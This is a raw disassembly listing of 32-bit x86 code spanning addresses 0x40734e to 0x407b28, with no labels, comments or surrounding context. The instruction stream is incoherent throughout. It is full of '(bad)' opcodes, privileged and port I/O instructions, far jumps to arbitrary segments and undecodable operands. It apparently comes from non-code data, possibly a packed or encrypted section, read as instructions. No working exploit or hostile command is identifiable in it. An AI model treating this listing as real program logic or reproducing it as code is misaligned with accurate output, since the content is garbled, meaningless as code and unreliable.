  40734e:	xchg   BYTE PTR [ebx+ecx*4+0x60],al
  407352:	or     ch,BYTE PTR [esi-0x38]
  407355:	icebp  
  407356:	cmp    al,0xe4
  407359:	mov    ah,0xfc
  40735b:	push   es
  40735c:	sub    eax,ebx
  40735e:	(bad)  
  40735f:	enter  0x439d,0x5c
  407363:	push   0x31
  407365:	sahf   
  407366:	cmc    
  407367:	xchg   edx,eax
  407368:	dec    ecx
  407369:	pop    esp
  40736a:	add    DWORD PTR [esi],ebp
  40736c:	and    esp,edi
  40736e:	jns    0x4073e3
  407370:	xor    DWORD PTR [edi-0x6fae8c06],eax
  407376:	push   esp
  407377:	fimul  WORD PTR [esi-0xd416496]
  40737d:	loop   0x4073fb
  40737f:	xor    DWORD PTR [edi-0x43],esp
  407382:	ret    0x966
  407385:	sbb    ecx,DWORD PTR ds:0x9c952e57
  40738b:	push   esp
  40738c:	push   0xb5513341
  407391:	xchg   esi,eax
  407392:	out    0x35,eax
  407394:	int    0x71
  407396:	cmp    eax,0x42becdcf
  40739b:	(bad)  
  40739c:	jge    0x40737c
  40739e:	cli    
  40739f:	retf   0x94d6
  4073a2:	jmp    ecx
  4073a4:	pop    ebp
  4073a5:	pop    ss
  4073a6:	mov    dl,0x78
  4073a8:	mov    ebx,0xb6419d90
  4073ad:	adc    cl,cl
  4073af:	pusha  
  4073b0:	(bad)  
  4073b1:	push   ebp
  4073b2:	add    al,0xcb
  4073b4:	into   
  4073b5:	loop   0x40736c
  4073b7:	mul    edi
  4073b9:	sti    
  4073ba:	cmp    edx,DWORD PTR [ebx+0x6]
  4073bd:	adc    bl,cl
  4073bf:	push   edx
  4073c0:	push   edx
  4073c1:	fst    DWORD PTR [ecx+0x1b]
  4073c4:	inc    esp
  4073c5:	data16 and BYTE PTR [ebx],bl
  4073c8:	imul   edx,DWORD PTR [ecx-0x4e],0xffffff82
  4073cc:	mov    ebp,0xcad0adaf
  4073d1:	fist   DWORD PTR [edx]
  4073d3:	jecxz  0x407429
  4073d5:	aaa    
  4073d6:	scas   eax,DWORD PTR es:[edi]
  4073d7:	(bad)  
  4073d8:	push   0xd886f64f
  4073dd:	or     BYTE PTR ds:0xa2d55ee6,dl
  4073e3:	jge    0x4073ba
  4073e5:	cwde   
  4073e6:	mov    bh,0x26
  4073e8:	add    eax,0xef059476
  4073ed:	cwde   
  4073ee:	fwait
  4073ef:	pop    es
  4073f0:	jnp    0x4073ab
  4073f2:	xor    BYTE PTR [eax+0x66],0x39
  4073f6:	inc    esp
  4073f7:	mov    dh,0x5e
  4073f9:	jb     0x407462
  4073fb:	leave  
  4073fc:	mov    bl,0xa
  4073fe:	inc    eax
  4073ff:	mov    al,ds:0x7993f905
  407404:	mov    cl,0xba
  407406:	xor    eax,0xc28aca4c
  40740b:	aad    0xa9
  40740d:	xor    al,0x99
  40740f:	outs   dx,BYTE PTR ds:[esi]
  407410:	mov    ebx,0x84645319
  407415:	push   es
  407416:	fdiv   st,st(7)
  407418:	or     BYTE PTR [ebp+0x4954a510],0xf
  40741f:	sbb    BYTE PTR [edx+0x458fe28d],dl
  407425:	lea    ebx,[esi+0x18f0f136]
  40742b:	push   eax
  40742c:	add    esi,eax
  40742e:	arpl   dx,bx
  407430:	lahf   
  407431:	in     al,dx
  407432:	push   ss
  407433:	adc    ebp,eax
  407435:	loopne 0x4073b8
  407437:	sahf   
  407438:	mov    gs,WORD PTR [eax]
  40743a:	test   eax,0x748e9f5b
  40743f:	test   DWORD PTR [edi],ebx
  407441:	bnd jno 0x407489
  407444:	adc    dh,BYTE PTR ds:0x9e37f40a
  40744a:	pop    ebx
  40744b:	and    dl,BYTE PTR [ecx+ebx*8-0x2535f546]
  407452:	push   esi
  407453:	stos   DWORD PTR es:[edi],eax
  407454:	inc    ecx
  407455:	jl     0x4074c9
  407457:	jns    0x4074aa
  407459:	jl     0x4074a3
  40745b:	sahf   
  40745c:	fs pop edx
  40745e:	jp     0x407446
  407460:	sbb    eax,0x3d3d4ec4
  407465:	fucompp 
  407467:	dec    esp
  407468:	rcl    BYTE PTR [edx-0x3e],cl
  40746b:	(bad)  
  40746c:	es xchg dl,dh
  40746f:	mov    ebp,ss
  407471:	pop    es
  407472:	push   0xffffffcf
  407474:	push   ebp
  407475:	mov    ds:0x345a7377,eax
  40747a:	test   al,0xee
  40747c:	and    eax,0x14f5b3e
  407481:	mov    esp,0xcb18a829
  407486:	repz mov edx,0x68819ca8
  40748c:	or     DWORD PTR [ebx],0x229b5127
  407492:	lea    ecx,[eax-0x50]
  407495:	pop    eax
  407496:	fs ins BYTE PTR es:[edi],dx
  407498:	iret   
  407499:	(bad)  
  40749b:	mov    ebx,0xe5640aae
  4074a0:	out    0x94,eax
  4074a2:	push   eax
  4074a3:	loop   0x40747a
  4074a5:	mov    edi,0x5f86fc52
  4074aa:	dec    esi
  4074ab:	sbb    DWORD PTR [edi-0x2f],ebx
  4074ae:	addr16 jg 0x40751e
  4074b1:	cli    
  4074b2:	xor    eax,0x90630e5d
  4074b7:	inc    ecx
  4074b8:	icebp  
  4074b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074ba:	or     al,0x49
  4074bc:	pop    ds
  4074bd:	xchg   ecx,eax
  4074be:	adc    DWORD PTR [ebx],0x9bd6a386
  4074c4:	int3   
  4074c5:	mov    ebp,0xcd9fd7b4
  4074ca:	jle    0x407517
  4074cc:	mov    ecx,0x87b7e559
  4074d1:	inc    esp
  4074d2:	mov    ah,0x4d
  4074d4:	idiv   BYTE PTR [ebx+0x1456f8ba]
  4074da:	sbb    eax,0x5217121e
  4074df:	das    
  4074e0:	daa    
  4074e1:	jecxz  0x407519
  4074e3:	lock in eax,0x1d
  4074e6:	int3   
  4074e7:	inc    edx
  4074e8:	(bad)  
  4074e9:	inc    edx
  4074ea:	mov    ah,0x43
  4074ec:	xchg   edx,eax
  4074ed:	test   BYTE PTR [edi-0xc8e8475],cl
  4074f3:	push   ebp
  4074f4:	div    BYTE PTR [eax]
  4074f6:	and    cl,bl
  4074f8:	les    esi,FWORD PTR [edi+eiz*2]
  4074fb:	mov    ds:0x86bb1de2,al
  407500:	push   edi
  407501:	in     eax,dx
  407502:	jl     0x40751e
  407504:	jmp    0x49f717ab
  407509:	xchg   ecx,eax
  40750a:	std    
  40750b:	sti    
  40750c:	xchg   ebp,edx
  40750e:	sbb    cl,ah
  407510:	xlat   BYTE PTR ds:[ebx]
  407511:	cmp    DWORD PTR [esi+0x4f4c1064],eax
  407517:	repnz aas 
  407519:	mov    eax,0xc748f13a
  40751e:	xchg   edi,eax
  40751f:	loopne 0x407519
  407521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407522:	hlt    
  407523:	ret    0x1a8
  407526:	sub    esi,DWORD PTR [edx+0x78d5c47e]
  40752c:	sbb    DWORD PTR [ecx],ebx
  40752e:	xor    esi,DWORD PTR [ecx+0x5e92f00b]
  407534:	aam    0x4a
  407536:	aas    
  407537:	call   0x99b71e7f
  40753c:	ds retf 
  40753e:	mov    ch,0xd9
  407540:	fmulp  st(6),st
  407542:	jle    0x40759d
  407544:	xchg   DWORD PTR [eax+0x78],ebp
  407547:	push   edx
  407548:	pop    esi
  407549:	sbb    eax,0x17fb7fd6
  40754e:	int    0x58
  407550:	xchg   edx,eax
  407551:	mov    edx,0xb341f329
  407556:	fwait
  407557:	pop    ebp
  407558:	in     al,0x34
  40755a:	shr    DWORD PTR ds:0xe30f0465,cl
  407560:	jns    0x407578
  407562:	adc    al,0xa1
  407564:	or     bl,0x52
  407567:	(bad)  
  407568:	xor    ecx,DWORD PTR [esi+0x7b329bdc]
  40756e:	sbb    DWORD PTR [eax+0x31d78a4],esi
  407574:	imul   ebp,DWORD PTR [esi+0x56],0xffffffb7
  407578:	adc    esi,DWORD PTR [eax+0x1e9ca842]
  40757e:	pop    ebp
  40757f:	sbb    al,0x6a
  407581:	sar    DWORD PTR [ecx+0x65],cl
  407584:	dec    ebx
  407585:	or     BYTE PTR [edx+0x46f52010],ch
  40758b:	popf   
  40758c:	ret    0xbd0a
  40758f:	mov    dl,0x52
  407591:	mov    dh,0x6c
  407593:	sub    ah,BYTE PTR [ebx+0x78dad1bf]
  407599:	ins    BYTE PTR es:[edi],dx
  40759a:	xor    dl,dl
  40759c:	fdivr  DWORD PTR [esi+0x3a]
  40759f:	(bad)  
  4075a0:	or     edi,eax
  4075a2:	sbb    dl,0xb2
  4075a5:	sar    DWORD PTR [esi+0x4a],1
  4075a8:	cwde   
  4075a9:	push   ecx
  4075aa:	cmp    ebx,DWORD PTR [eax-0x11]
  4075ad:	sbb    ah,0x8e
  4075b0:	push   ss
  4075b1:	adc    bl,BYTE PTR [ebp+0x25ae818f]
  4075b7:	adc    eax,0x90192917
  4075bc:	sub    DWORD PTR [ecx+ebx*1],0x1c
  4075c0:	dec    edx
  4075c1:	sahf   
  4075c2:	sbb    cl,BYTE PTR [ecx+0x6a]
  4075c5:	jbe    0x4075a3
  4075c7:	sahf   
  4075c8:	(bad)  
  4075c9:	adc    DWORD PTR [esi-0x55a69b77],ebp
  4075cf:	adc    DWORD PTR [esi],0xffffffad
  4075d2:	mov    ds:0xa76c5e12,eax
  4075d7:	xchg   ebp,eax
  4075d8:	inc    edx
  4075d9:	inc    eax
  4075da:	(bad)  
  4075dc:	ret    
  4075dd:	ds iret 
  4075df:	in     eax,dx
  4075e0:	xor    al,0xb6
  4075e2:	inc    ebx
  4075e3:	dec    ebp
  4075e4:	push   ebx
  4075e5:	mov    ch,0x4b
  4075e7:	xor    DWORD PTR [eax+0x6b],ebx
  4075ea:	inc    ecx
  4075eb:	push   edx
  4075ed:	lea    esi,[ebp-0x12]
  4075f0:	or     esp,ebx
  4075f2:	mov    edx,0x2dc43cdb
  4075f7:	rcr    esp,0xd1
  4075fa:	mov    cl,0x3d
  4075fc:	test   cl,0x10
  4075ff:	pop    edi
  407600:	mov    ch,0xe6
  407602:	jmp    FWORD PTR [edi]
  407604:	popf   
  407605:	mov    WORD PTR [eax],?
  407607:	cmp    esi,edi
  407609:	xor    eax,0xbacbb2aa
  40760e:	pusha  
  40760f:	xor    BYTE PTR [eax+esi*2-0x63],dl
  407613:	fs push esp
  407615:	xor    esp,DWORD PTR [edx]
  407617:	imul   ebp,DWORD PTR [ebx+0x257a5ae2],0x39618fa5
  407621:	into   
  407622:	popa   
  407623:	clc    
  407624:	and    al,0x5
  407626:	addr16 imul esp,ebx,0xffffffdf
  40762a:	push   es
  40762b:	(bad)  
  40762c:	dec    esp
  40762d:	xor    al,0x77
  40762f:	ds shl cl,1
  407632:	sub    bh,BYTE PTR [edi-0x21]
  407635:	xchg   ebp,eax
  407636:	sub    ebx,ebx
  407638:	push   ebx
  407639:	sub    DWORD PTR [eax-0x24],ecx
  40763c:	repnz xchg esi,eax
  40763e:	sbb    bh,al
  407640:	(bad)  
  407641:	sar    cl,cl
  407643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407644:	xchg   esp,eax
  407645:	std    
  407646:	mov    al,0x4d
  407648:	ins    BYTE PTR es:[edi],dx
  407649:	mov    gs,WORD PTR [edi-0x68d383de]
  40764f:	xor    al,0xf9
  407651:	(bad)  
  407652:	repz sbb BYTE PTR [ecx+0x17],dl
  407656:	dec    ecx
  407657:	cmp    ebx,eax
  407659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40765a:	(bad)  
  40765b:	jo     0x40769c
  40765d:	jp     0x407603
  40765f:	push   ecx
  407660:	outs   dx,DWORD PTR ds:[esi]
  407661:	push   edi
  407662:	gs pop ecx
  407664:	jecxz  0x407649
  407666:	mov    DWORD PTR [ebp-0x68],edi
  407669:	mov    ch,0x24
  40766b:	jns    0x4076c2
  40766d:	out    dx,al
  40766e:	(bad)  
  40766f:	cmp    al,0x5d
  407671:	jge    0x4076c7
  407673:	adc    DWORD PTR [edi+edx*2-0x47fdaacb],eax
  40767a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40767b:	stos   BYTE PTR es:[edi],al
  40767c:	ss popf 
  40767e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40767f:	pop    esp
  407680:	bsr    edi,DWORD PTR [edx+edx*4]
  407684:	aam    0xf4
  407686:	mov    dh,0xff
  407688:	enter  0x4331,0x4c
  40768c:	mov    ds:0x79cb62,eax
  407691:	fwait
  407692:	inc    edx
  407693:	stos   DWORD PTR es:[edi],eax
  407694:	mov    esi,0x8d95aee3
  407699:	enter  0x635f,0xe3
  40769d:	rcr    DWORD PTR [ecx+edi*4-0xa39233c],cl
  4076a4:	mov    ebp,0x38cfd5a7
  4076a9:	sar    DWORD PTR [ebx-0x13ea5822],cl
  4076af:	push   es
  4076b0:	lods   eax,DWORD PTR ds:[esi]
  4076b1:	cwde   
  4076b2:	add    edi,DWORD PTR [eax]
  4076b4:	pop    ebx
  4076b5:	mov    ecx,edx
  4076b7:	dec    eax
  4076b8:	out    dx,al
  4076b9:	enter  0xc271,0xd3
  4076bd:	adc    al,0x9e
  4076bf:	cmp    ebp,ecx
  4076c1:	test   BYTE PTR [ebx-0x169b3a96],0xd1
  4076c8:	dec    DWORD PTR [ebx]
  4076ca:	or     DWORD PTR [edi+0x6b],0x5b
  4076ce:	adc    al,0x1d
  4076d0:	sti    
  4076d1:	add    edi,DWORD PTR [ecx+edi*8+0x21]
  4076d5:	dec    esi
  4076d6:	push   ds
  4076d7:	(bad)  
  4076d9:	leave  
  4076da:	in     eax,dx
  4076db:	je     0x4076ec
  4076dd:	jmp    0x4076fa
  4076df:	adc    DWORD PTR [ecx-0x40],edx
  4076e2:	mov    ebx,0xfc796baf
  4076e7:	int    0x64
  4076e9:	mov    ?,WORD PTR [ebx+ecx*2-0x15f017e]
  4076f0:	or     edi,DWORD PTR [edi-0x5c6c0fb8]
  4076f6:	(bad)  
  4076f7:	stc    
  4076f8:	dec    eax
  4076f9:	lods   eax,DWORD PTR ds:[esi]
  4076fa:	ja     0x407746
  4076fc:	and    al,BYTE PTR [ecx+0x641a633f]
  407702:	outs   dx,DWORD PTR ds:[esi]
  407704:	pop    ebp
  407705:	fwait
  407706:	push   0xb1d974d9
  40770b:	cmp    DWORD PTR ds:0xa65d8517,ecx
  407711:	jmp    0xb650857f
  407716:	inc    DWORD PTR [esi]
  407718:	aaa    
  407719:	fdivr  st,st(3)
  40771b:	sub    BYTE PTR [edi],dh
  40771d:	aad    0x41
  40771f:	jbe    0x40778a
  407721:	pop    esi
  407722:	xor    eax,0xa187c8d3
  407727:	push   eax
  407728:	arpl   WORD PTR [ebp+0x385355dc],dx
  40772e:	xor    esp,DWORD PTR [edi-0x76e27ec1]
  407734:	loop   0x4077af
  407736:	mov    ebp,0x7be67d6
  40773b:	out    dx,al
  40773c:	ret    
  40773d:	xor    ebp,ecx
  40773f:	aam    0xbf
  407741:	pusha  
  407742:	cmp    DWORD PTR [esi],eax
  407744:	(bad)  
  407745:	into   
  407746:	test   BYTE PTR [eax+0x5a3f857d],bh
  40774c:	int    0x42
  40774e:	xor    DWORD PTR [ecx],edx
  407750:	jae    0x407760
  407752:	leave  
  407753:	and    dh,BYTE PTR [ecx-0x3b16a637]
  407759:	test   DWORD PTR [ebp-0x3a5eeb14],0x8b1ef1b0
  407763:	dec    esi
  407764:	jns    0x4077cf
  407766:	sti    
  407767:	pop    eax
  407768:	ret    
  407769:	enter  0x68ec,0x10
  40776d:	and    eax,0x2657b885
  407772:	or     DWORD PTR [esi-0x7d4fee0],edi
  407778:	test   BYTE PTR [ebp+ebx*4+0x12],ch
  40777c:	in     eax,0x85
  40777e:	neg    DWORD PTR fs:0xdffdbeec
  407785:	sbb    BYTE PTR [ebp-0x28],0x37
  407789:	aaa    
  40778a:	mov    ah,0xb0
  40778c:	sahf   
  40778d:	adc    al,0xbe
  40778f:	pop    edi
  407790:	pushf  
  407791:	pop    edi
  407792:	mov    ebp,0x7b6ed362
  407797:	(bad)  [edx]
  407799:	xchg   edx,eax
  40779a:	mov    gs,WORD PTR [edi+eiz*2]
  40779d:	repz inc edi
  40779f:	xchg   ebp,eax
  4077a0:	(bad)  
  4077a1:	shl    DWORD PTR [esi],1
  4077a3:	call   0x3c53:0xe4914c56
  4077aa:	cwde   
  4077ab:	out    0xec,al
  4077ad:	xchg   ebp,eax
  4077ae:	inc    ebp
  4077af:	imul   edi,DWORD PTR [edx+eiz*4-0x4b],0xffffffe5
  4077b4:	mov    al,0xb3
  4077b6:	mov    ds:0x24b5cf23,al
  4077bb:	jbe    0x407772
  4077bd:	rol    ebp,0xa8
  4077c0:	xchg   ecx,eax
  4077c1:	fwait
  4077c2:	repnz loopne 0x407750
  4077c5:	cmp    eax,0x23a868dd
  4077ca:	xlat   BYTE PTR ds:[ebx]
  4077cb:	jmp    0x4e111b39
  4077d0:	frstor [ebp+esi*4+0x4]
  4077d4:	stos   BYTE PTR es:[edi],al
  4077d5:	jo     0x40775d
  4077d7:	jne    0x4077c7
  4077d9:	mov    eax,ss
  4077db:	adc    eax,0xf855b0f5
  4077e0:	lods   al,BYTE PTR ds:[esi]
  4077e1:	(bad)  
  4077e2:	cdq    
  4077e3:	sub    al,0xec
  4077e5:	jnp    0x4077dc
  4077e7:	in     al,dx
  4077e8:	jb     0x40782d
  4077ea:	repz inc ebp
  4077ec:	mov    es,WORD PTR [edx+0x73]
  4077ef:	and    eax,0xe055d6f3
  4077f4:	sub    al,0x6e
  4077f6:	popf   
  4077f7:	xor    DWORD PTR [ebx-0x21],eax
  4077fa:	dec    edx
  4077fb:	test   DWORD PTR [esi-0x13d3867],edx
  407801:	push   es
  407802:	(bad)  
  407803:	pop    ecx
  407804:	mov    WORD PTR ds:0x8011b82c,ss
  40780a:	or     bh,ah
  40780c:	mov    ebx,0x6a13d364
  407811:	dec    ebx
  407812:	lods   eax,DWORD PTR ds:[esi]
  407813:	push   cs
  407814:	stos   DWORD PTR es:[edi],eax
  407815:	cmp    esi,DWORD PTR [eax-0xbe0b742]
  40781b:	rcl    eax,1
  40781d:	loope  0x40784b
  40781f:	push   0xb869ff99
  407824:	retf   0x584e
  407827:	sbb    ah,al
  407829:	cdq    
  40782a:	inc    ebp
  40782b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40782c:	scas   eax,DWORD PTR es:[edi]
  40782d:	mov    ecx,gs
  40782f:	sahf   
  407830:	sbb    al,0x32
  407832:	inc    edi
  407833:	ss push ebp
  407835:	test   DWORD PTR [edx-0x13f9e0b1],ecx
  40783b:	mov    ds:0x10901867,eax
  407840:	adc    DWORD PTR [edx-0x2b5875c0],ebx
  407846:	(bad)  
  407847:	jge    0x4078af
  407849:	pushf  
  40784a:	imul   edi,ebp,0x1622faf9
  407850:	cli    
  407851:	pop    ebp
  407852:	or     bl,BYTE PTR [ebx-0x7fb4dd18]
  407858:	(bad)  
  407859:	xchg   ecx,eax
  40785a:	cli    
  40785b:	out    dx,eax
  40785c:	clc    
  40785d:	mov    ds:0x4babbce8,al
  407862:	mov    al,ds:0x21830a91
  407867:	xchg   esi,eax
  407868:	and    eax,0xb72d414c
  40786d:	sbb    esi,DWORD PTR [eax]
  40786f:	jns    0x407853
  407871:	adc    al,0x5
  407873:	psllq  mm7,QWORD PTR ds:0x45f95229
  40787a:	imul   ebx,DWORD PTR [ebp+0x52],0xffffff87
  40787e:	sub    al,0x25
  407880:	ss inc ebp
  407882:	pop    ss
  407883:	(bad)  
  407884:	cmc    
  407885:	sub    dl,dl
  407887:	fisub  WORD PTR [esi+0xfe331a3]
  40788d:	add    bl,BYTE PTR [edi-0x5f]
  407890:	xor    ch,BYTE PTR [edx-0x9e78b59]
  407896:	mov    ecx,DWORD PTR [ecx+0x41]
  407899:	cld    
  40789a:	test   al,0xc1
  40789c:	pop    ebx
  40789d:	fidiv  DWORD PTR [esi-0x4d2842f2]
  4078a3:	xchg   esp,eax
  4078a4:	sahf   
  4078a5:	push   esi
  4078a6:	adc    eax,0x9c45a5e7
  4078ab:	dec    edx
  4078ac:	in     al,dx
  4078ad:	cli    
  4078ae:	test   BYTE PTR [eax+0x16],bl
  4078b1:	mov    eax,DWORD PTR [esi+0x63]
  4078b4:	ficom  DWORD PTR [edx-0x47]
  4078b7:	imul   ecx,edi,0x16
  4078ba:	cmp    al,0x50
  4078bc:	test   BYTE PTR [esi-0x1b],ah
  4078bf:	xchg   esp,eax
  4078c0:	add    al,0x43
  4078c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078c3:	cmp    al,0x23
  4078c5:	daa    
  4078c6:	ja     0x4078b8
  4078c8:	sbb    edx,DWORD PTR [ecx+0x33]
  4078cb:	sar    DWORD PTR [ebp-0x2c640a05],cl
  4078d1:	jne    0x4078ea
  4078d3:	cmp    al,0x5
  4078d5:	mov    ecx,0x7f471303
  4078da:	dec    ebx
  4078db:	sbb    ch,BYTE PTR [eax]
  4078dd:	test   al,0x3d
  4078df:	clc    
  4078e0:	xchg   edx,eax
  4078e1:	aad    0xb5
  4078e3:	mov    dl,0xb2
  4078e5:	dec    ebx
  4078e6:	xor    al,0x6
  4078e8:	pop    eax
  4078e9:	es mov edi,0xf8b859b8
  4078ef:	retf   0x1e65
  4078f2:	jne    0x4078e4
  4078f4:	fadd   QWORD PTR [ebp+0x58b84652]
  4078fa:	aam    0x91
  4078fc:	jle    0x40788b
  4078fe:	ret    
  4078ff:	mov    ?,esi
  407901:	sub    al,0xb4
  407903:	loope  0x4078a3
  407905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407906:	sbb    al,ch
  407908:	pop    esi
  407909:	retf   0x7d1f
  40790c:	push   esp
  40790d:	jmp    0xa921:0xe6371d09
  407914:	dec    ebp
  407915:	stc    
  407916:	(bad)  
  407917:	xor    eax,0x2da6c864
  40791c:	sbb    BYTE PTR [edx+0x22f2c609],dl
  407922:	in     al,dx
  407923:	mov    ds:0xf2ee2d0d,al
  407928:	jp     0x407918
  40792a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40792b:	add    DWORD PTR [ebx],eax
  40792d:	xchg   ebx,eax
  40792e:	pusha  
  40792f:	and    ecx,DWORD PTR [edx-0x35dafb96]
  407935:	pop    ebp
  407936:	mov    ?,WORD PTR [ebx+0x54]
  407939:	sub    DWORD PTR [esi],0x740bdbba
  40793f:	sub    al,0xd6
  407941:	out    dx,eax
  407942:	mov    ecx,0x2f0fa2e9
  407947:	cmp    BYTE PTR [ebp+0x46c31d10],dl
  40794d:	add    edx,ebx
  40794f:	test   eax,0xd0d682ee
  407954:	inc    ebp
  407955:	scas   eax,DWORD PTR es:[edi]
  407956:	shl    BYTE PTR [ecx-0x1c0f2f79],cl
  40795c:	mov    BYTE PTR [edx],dh
  40795e:	dec    edi
  40795f:	or     BYTE PTR [edi-0x5f],al
  407962:	mov    esp,0x16442937
  407967:	fs sahf 
  407969:	test   al,0xce
  40796b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40796c:	stos   DWORD PTR es:[edi],eax
  40796d:	test   eax,0xbb2d5223
  407972:	shr    DWORD PTR [ecx+ecx*2+0x37689929],0x7c
  40797a:	icebp  
  40797b:	cmp    al,0x95
  40797d:	add    BYTE PTR [ebx],dh
  40797f:	repnz cwde 
  407981:	test   DWORD PTR [ecx-0x2b06047c],ebx
  407987:	test   ah,0xe1
  40798a:	mov    ebx,0x54ecd0a3
  40798f:	sbb    bl,BYTE PTR [edi+edx*1]
  407992:	je     0x40798b
  407994:	or     dl,BYTE PTR [ecx+0x1c]
  407997:	les    eax,FWORD PTR [ebp-0x27]
  40799a:	adc    bh,al
  40799c:	cmp    al,0x5a
  40799e:	mov    al,0xdc
  4079a0:	mov    cl,0x9d
  4079a2:	push   edi
  4079a3:	mov    edi,esp
  4079a5:	outs   dx,DWORD PTR ds:[esi]
  4079a6:	sub    al,0x6b
  4079a8:	pop    edi
  4079a9:	push   cs
  4079aa:	cmp    eax,0x124300c5
  4079af:	jmp    0x8d82f8c3
  4079b4:	retf   0x52cd
  4079b7:	and    al,0xbd
  4079b9:	ret    0x771
  4079bc:	icebp  
  4079bd:	fs pusha 
  4079bf:	push   0x7ace50ec
  4079c4:	sar    BYTE PTR [ecx],0xf7
  4079c7:	mov    eax,0xb89b372a
  4079cc:	xor    al,dl
  4079ce:	lock mov edx,0x7307d1c6
  4079d4:	iret   
  4079d5:	adc    ebx,DWORD PTR [edx]
  4079d7:	mov    BYTE PTR [ecx+ecx*2],dh
  4079da:	gs pusha 
  4079dc:	shl    DWORD PTR [eax],0x42
  4079df:	adc    edx,DWORD PTR [ecx-0x37cfd2c8]
  4079e5:	out    dx,al
  4079e6:	push   0x1
  4079e8:	dec    edi
  4079e9:	jbe    0x4079a7
  4079eb:	cmp    BYTE PTR [edi-0x1730857c],bh
  4079f1:	shr    BYTE PTR [eax-0x12],1
  4079f4:	inc    ecx
  4079f5:	mov    dh,0x69
  4079f7:	xchg   ebx,eax
  4079f8:	mov    gs,WORD PTR [ecx-0x2be64fec]
  4079fe:	stos   DWORD PTR es:[edi],eax
  4079ff:	sahf   
  407a00:	(bad)  [esi]
  407a02:	scas   al,BYTE PTR es:[edi]
  407a03:	mov    edx,0x127a3c49
  407a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a09:	or     BYTE PTR [ebx+0x47],0xe2
  407a0d:	mov    esp,0x63862e36
  407a12:	jo     0x407a05
  407a14:	xchg   edi,eax
  407a15:	ds nop
  407a17:	fwait
  407a18:	xchg   DWORD PTR [ebp-0x2a],eax
  407a1b:	sub    BYTE PTR [edi+eiz*1],dl
  407a1e:	test   BYTE PTR [ebp+ebx*8+0x3c],0x3b
  407a23:	jmp    0x30eee3b8
  407a28:	enter  0x1a2,0xdc
  407a2c:	jmp    0x2b55:0x7d708f6c
  407a33:	xor    ebx,eax
  407a35:	adc    eax,0x16f60e28
  407a3a:	mov    al,0x3c
  407a3c:	cmp    ecx,DWORD PTR [ebp-0x54]
  407a3f:	jle    0x407a68
  407a41:	int3   
  407a42:	jmp    0xad92:0xe71e5642
  407a49:	jmp    0x22d7316f
  407a4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a4f:	cmp    bh,BYTE PTR [esi+0x71]
  407a52:	sbb    eax,DWORD PTR [ebx]
  407a54:	lods   eax,DWORD PTR ds:[esi]
  407a55:	pop    edi
  407a56:	cmp    DWORD PTR [ecx],edi
  407a58:	hlt    
  407a59:	call   0x7a1d:0xf64173d9
  407a60:	aam    0x7f
  407a62:	shl    ebp,cl
  407a64:	inc    edx
  407a65:	not    BYTE PTR [edi+eiz*8]
  407a68:	daa    
  407a69:	ins    DWORD PTR es:[edi],dx
  407a6a:	xchg   esi,eax
  407a6b:	and    al,0xbc
  407a6d:	out    0x92,al
  407a6f:	jnp    0x407a09
  407a71:	push   ebp
  407a72:	in     al,0x69
  407a74:	in     al,0x23
  407a76:	call   0xad2a:0x12eb551f
  407a7d:	fcmovbe st,st(0)
  407a7f:	jo     0x407ae4
  407a81:	xchg   esi,eax
  407a82:	and    esp,DWORD PTR [eax-0x4357e2e0]
  407a88:	jmp    0x407a37
  407a8a:	or     ecx,DWORD PTR [ebx]
  407a8c:	mov    al,0x8b
  407a8e:	jae    0x407a9e
  407a90:	lea    esp,[edx-0x70]
  407a93:	inc    edx
  407a94:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  407a96:	aam    0x8a
  407a98:	push   ecx
  407a99:	imul   esp,esp,0x49
  407a9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a9d:	test   BYTE PTR [eax],0x80
  407aa0:	inc    eax
  407aa1:	gs mov esp,0x12fa2edf
  407aa7:	daa    
  407aa8:	in     al,0xc5
  407aaa:	push   ebp
  407aab:	sub    esp,DWORD PTR [esi-0x69f78610]
  407ab1:	retf   0x17bf
  407ab4:	lods   al,BYTE PTR ds:[esi]
  407ab5:	fisubr DWORD PTR [esi+0x12]
  407ab8:	fisub  WORD PTR [ecx-0x37ae5830]
  407abe:	pop    ebx
  407abf:	mov    bl,0x10
  407ac1:	push   0xffffffb5
  407ac3:	pusha  
  407ac4:	daa    
  407ac5:	jle    0x407af5
  407ac7:	or     DWORD PTR [esi+0x19],edx
  407aca:	or     bl,BYTE PTR [esi-0x458d2c3d]
  407ad0:	inc    edx
  407ad1:	adc    ebp,ecx
  407ad3:	inc    esp
  407ad4:	xchg   esi,eax
  407ad5:	int3   
  407ad6:	and    edx,DWORD PTR [edx+0x20ace23c]
  407adc:	pop    esp
  407add:	cmp    BYTE PTR [edi-0x270830cf],dl
  407ae3:	push   edi
  407ae4:	enter  0xc252,0x7c
  407ae8:	aad    0xde
  407aea:	mov    dl,0xb4
  407aec:	sbb    eax,0xcc0203bf
  407af1:	pop    edx
  407af2:	and    DWORD PTR [ecx],edx
  407af4:	outs   dx,BYTE PTR ds:[esi]
  407af5:	mov    al,ds:0xc8cc1286
  407afa:	push   ss
  407afb:	jns    0x407ac9
  407afd:	lea    ecx,[ebp+0x5819b5dd]
  407b03:	dec    ebp
  407b04:	nop
  407b05:	outs   dx,DWORD PTR ds:[esi]
  407b06:	pop    ds
  407b07:	leave  
  407b08:	fs add edx,ebx
  407b0b:	jb     0x407b75
  407b0d:	pop    ebp
  407b0e:	push   edx
  407b0f:	sub    edx,edx
  407b11:	jg     0x407b1c
  407b13:	cmp    ebx,0xd400d7bd
  407b19:	aaa    
  407b1a:	mov    eax,ds:0x7a18e686
  407b1f:	(bad)  
  407b20:	stos   BYTE PTR es:[edi],al
  407b21:	fidiv  WORD PTR [ebp+0x78]
  407b24:	inc    eax
  407b25:	mov    dl,0x20
  407b27:	xlat   BYTE PTR ds:[ebx]
  407b28:	push   gs
